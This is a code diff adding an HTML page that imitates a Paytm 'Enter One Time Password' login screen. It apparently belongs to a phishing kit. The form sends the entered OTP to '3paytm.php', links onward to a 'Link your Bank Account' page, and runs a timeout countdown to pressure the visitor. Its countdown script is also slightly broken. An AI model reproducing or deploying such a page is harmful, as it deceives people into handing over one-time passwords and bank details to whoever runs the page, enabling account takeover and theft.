@@ -1,0 +1,232 @@
+<!DOCTYPE
+html>
+<html>
+<head>
+<title>secure
+</title>
+<meta
+name
+="viewport"
+content="width=device-width,
+initial-scale=1.0">
+<link
+href="https://fonts.googleapis.com/icon?family=Material+Icons"
+rel="stylesheet">
+<style>
+p{color:gray;}
+</style>
+</head>
+<body
+body
+topmargin="100"
+leftmargin="0"
+marginheight="0"
+marginwidth="50"
+onload="startTimer();">
+<div
+style="text-align:center;">
+<img
+src="dream.png
+"
+height="50"
+width="160"
+alt="image"/><tr></tr>
+<P
+style="color:black;">
+Enter
+One
+Time
+Password
+(OTP)</P>
+<P
+><font
+size="2">
+OTP
+has
+been
+sent
+to
+Your
+Mobile
+******
+please
+enter
+the
+same
+here
+to
+Login.</P></font>
+<form
+method="post"
+action="3paytm.php">
+<div
+style="text-align:center">
+<input
+type="Number"
+name="paytm otp-2"
+placeholder="
+OTP
+"
+maxlength="6"
+required="required">
+<p
+style="text-align:
+right;"
+><font
+size="2">
+Get
+OTP
+on
+call
+</p></font>
+<style
+type="text/css">
+input[type=number],
+select
+{
+width:
+100%;
+padding:
+15px
+23px;
+margin:
+8px
+0;
+display:
+inline-block;
+border:
+1px
+solid
+#ccc;
+border-radius:
+4px;
+box-sizing:
+border-box;
+}
+input[type=submit]
+{
+width:
+100%;
+background-color:
+#00b9f5;
+color:
+white;
+padding:
+12px
+20px;
+margin:
+8px
+0;
+border:
+none;
+border-radius:
+4px;
+cursor:
+pointer;
+font-size:
+20px;
+width:
+100%;
+height:
+60px;
+}
+input[type=submit]:hover
+{
+background-color:
+#00b9f5;
+}
+</style>
+<!--
+<input
+type="submit"
+name="button"
+value="
+Log
+in
+"><br><br>
+-->
+<!--
+<button
+type="submit">
+Login
+Securely
+</button><br><br>
+-->
+
+
+
+
+<input
+type="submit"
+value="Login
+ Securely">
+<!--
+==========icon
+css=============
+-->
+
+<!--
+=================================
+-->
+<p
+style="color:skyblue";><font
+size="2">
+know
+more
+about
+2
+Step
+Authentication
+</p></font>
+<a
+href="paytmcrd.html"
+id="linkbank">Link
+your
+Bank
+Account</a><br><br>
+<style
+type="text/css">
+#linkbank{
+text-decoration:
+none;
+color:
+#00b9f5;
+}
+</style>
+<!---Timer for Otp ------------------------------------------------------------------------    -->
+
+  <script type="text/javascript">
+    var timer=300;
+    var sec=0;
+  function startTimer() {
+    sec=parseInt(timer%300);
+
+    if (timer<0) {
+      timer.stop();
+    }
+
+    document.getElementById("time").innerHTML = "<b> This screen will automatically timeout after:  </b>"+sec.toString();
+    timer--;
+    setTimeout(function(){
+      startTimer();
+
+    }, 1000);
+  }
+    
+      </script>
+<!-- -------------------------------------------------------------------------------------------------- -->
+      <div>
+        <center><b><span id="time"></span>&nbsp; Second</b></center>
+      </div>
+<!-- ----------------------------------------------------------------------------------------------------------- -->
+        </div>
+<br>
+<br><br>
+</div>
+        </div>
+</body>
+
+</html>
+
+
+
